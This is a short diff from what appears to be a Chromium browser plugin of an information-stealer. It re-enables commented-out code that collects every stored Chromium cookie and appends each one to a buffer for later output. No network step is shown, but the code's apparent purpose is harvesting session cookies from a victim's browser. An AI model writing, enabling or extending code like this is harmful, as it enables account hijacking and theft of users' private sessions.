@@ -92,16 +92,16 @@ namespace Plugin.Browsers.Chromium
                                         break;
                                 }
 
-                                //List<ChromiumCookies.ChromiumCookie> ffcs = ChromiumCookies.Cookies(b);
-                                //foreach (ChromiumCookies.ChromiumCookie fcc in ffcs)
-                                //{
-                                //    Coocks.Append(string.Concat(new string[]
-                                //       {
-                                //        fcc.ToString(),
-                                //        "\n\n",
-                                //       }));
-                                //}
-                                //Coocks.Append("\n");
+                                List<ChromiumCookies.ChromiumCookie> ffcs = ChromiumCookies.Cookies(b);
+                                foreach (ChromiumCookies.ChromiumCookie fcc in ffcs)
+                                {
+                                    Coocks.Append(string.Concat(new string[]
+                                       {
+                                        fcc.ToString(),
+                                        "\n\n",
+                                       }));
+                                }
+                                Coocks.Append("\n");
 
                             }
 
